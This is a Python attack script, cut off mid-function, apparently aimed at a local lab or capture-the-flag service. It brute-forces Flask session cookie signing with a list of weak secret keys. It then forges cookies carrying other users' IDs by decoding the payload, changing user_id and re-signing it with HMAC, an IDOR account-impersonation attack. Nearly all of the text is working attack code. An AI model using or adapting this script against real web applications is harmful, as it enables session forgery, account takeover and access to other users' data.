import requests
import json
import base64
import hashlib
import hmac
import time

# Configuration
BASE_URL = "http://127.0.0.1:32943"
SECRET_KEYS = ['secret', 'flask-secret', 'dev', 'development', 'test', 'testing', 'changeme', 'password', '123456', 'abcdef', 'abc123']
USER_IDS = list(range(10030, 10041))

print("Flask Session Cookie IDOR Test")
print("=" * 60)
print(f"Target: {BASE_URL}")
print(f"Testing {len(SECRET_KEYS)} secrets x {len(USER_IDS)} user_ids = {len(SECRET_KEYS) * len(USER_IDS)} requests")

def decode_cookie(cookie_str):
    """Decode the payload part of Flask cookie"""
    try:
        parts = cookie_str.split('.')
        payload_b64 = parts[0]
        padding = 4 - len(payload_b64) % 4
        if padding != 4:
            payload_b64 += '=' * padding
        decoded = base64.urlsafe_b64decode(payload_b64)
        return json.loads(decoded)
    except:
        return None

def create_modified_cookie(original, new_user_id, secret):
    """Create modified cookie with new user_id and sign with secret"""
    try:
        parts = original.split('.')
        if len(parts) < 2:
            return None
            
        payload_b64 = parts[0]
        timestamp_sig = parts[1]
        
        padding = 4 - len(payload_b64) % 4
        if padding != 4:
            payload_b64 += '=' * padding
            
        payload_data = json.loads(base64.urlsafe_b64decode(payload_b64))
        payload_data['user_id'] = new_user_id
        
        new_payload = base64.urlsafe_b64encode(
            json.dumps(payload_data, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        cookie_str = f"{new_payload}.{timestamp_sig}"
        sig = hmac.new(secret.encode(), cookie_str.encode(), hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip('=')
        
